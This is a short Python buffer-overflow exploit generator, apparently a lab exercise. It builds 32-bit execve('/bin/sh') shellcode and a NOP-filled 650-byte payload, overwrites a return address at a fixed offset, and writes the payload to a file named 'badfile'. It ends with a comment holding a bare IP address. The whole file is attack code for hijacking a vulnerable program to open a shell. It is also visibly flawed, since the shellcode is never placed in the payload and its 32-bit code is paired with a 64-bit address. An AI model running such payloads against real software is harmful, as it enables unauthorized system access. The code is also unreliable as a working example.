import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

# Fill the content with NOPs 
content = bytearray(0x90 for i in range(650)) 
ret=0x55555555525b
content[171:179]=(ret).to_bytes(8,byteorder='little') 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 
# 20.244.39.131